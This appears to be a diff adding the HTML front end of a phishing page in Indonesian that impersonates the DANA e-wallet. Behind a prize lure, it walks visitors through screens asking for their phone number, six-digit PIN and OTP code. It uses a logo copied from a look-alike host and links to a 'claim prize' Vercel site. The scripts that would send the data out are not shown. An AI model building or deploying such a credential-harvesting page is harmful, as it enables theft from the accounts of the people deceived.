@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi, Keberuntungan, Kamu</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Halaman Nomor Telepon -->
+    <div id="number-page" style="display: block;">
+      <a href="https://website-claim-hadiah-app-624w.vercel.app/" target="_blank">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
+      </a>
+      <h2>Masukkan Nomor HP kamu</h2>
+      <div class="phone-input-container">
+        <div class="country-code-box">
+          <span>+62</span>
+        </div>
+        <input type="text" id="phone-number" placeholder="8811-2345-6789" maxlength="15" inputmode="numeric">
+      </div>
+      <p class="info-text">
+        Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.
+      </p>
+    </div>
+
+    <!-- Halaman PIN -->
+    <div id="pin-page" style="display: none;">
+      <a href="https://website-claim-hadiah-app-624w.vercel.app/" target="_blank">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
+      </a>
+      <h2>Masukkan PIN</h2>
+      <div class="pin-container">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+        <input type="text" class="input-box pin-box" maxlength="1" oninput="moveToNextInput(this, 'pin')" inputmode="numeric">
+      </div>
+      <div class="show-text-container">
+        <span>Tampilkan</span>
+      </div>
+      <div class="help-forgot-container">
+        <a href="#" class="link">Bantuan</a>
+        <a href="#" class="link">Lupa PIN?</a>
+      </div>
+    </div>
+
+    <!-- Halaman OTP -->
+    <div id="otp-page" style="display: none;">
+      <a href="https://website-claim-hadiah-app-624w.vercel.app/" target="_blank">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo dana" class="logo">
+      </a>
+      <h2>Masukkan Kode OTP</h2>
+      <div class="otp-container">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+        <input type="text" class="input-box otp-box" maxlength="1" oninput="moveToNextInput(this, 'otp')" inputmode="numeric">
+      </div>
+      <p class="berhadiah-text">🎁 Berhadiah! Verifikasi sekarang untuk kesempatan menang hadiah menarik!!!</p>
+      <div id="floating-notification" class="floating-notification">
+        Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <p>&copy; 2025 HDGT khusus yang terpilih saja.</p>
+    <button id="lanjutkan-button" class="button" onclick="goToNextPage()">Lanjutkan</button>
+  </div>
+
+  <script src="javascript.js"></script>
+  <script src="server.js"></script>
+</body>
+</html>
